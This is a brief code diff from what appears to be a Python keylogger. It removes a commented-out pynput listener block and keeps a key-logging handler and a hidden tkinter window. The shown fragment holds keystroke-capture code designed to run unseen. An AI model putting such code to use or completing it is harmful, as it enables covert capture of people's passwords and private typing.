@@ -15,16 +15,6 @@ def on_press(key):
     except AttributeError:
         logging.info(f'Special key pressed: {key}')
 
-"""def on_release(key):
-    if key == pynput.keyboard.Key.alt:
-        return False
-
-print("[*] Press 'Esc' to stop and exit.")
-with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()"""
-
-
-
 
 
 root = tk.Tk()
@@ -32,3 +22,4 @@ root = tk.Tk()
 root.withdraw()
 
 root.mainloop()
+
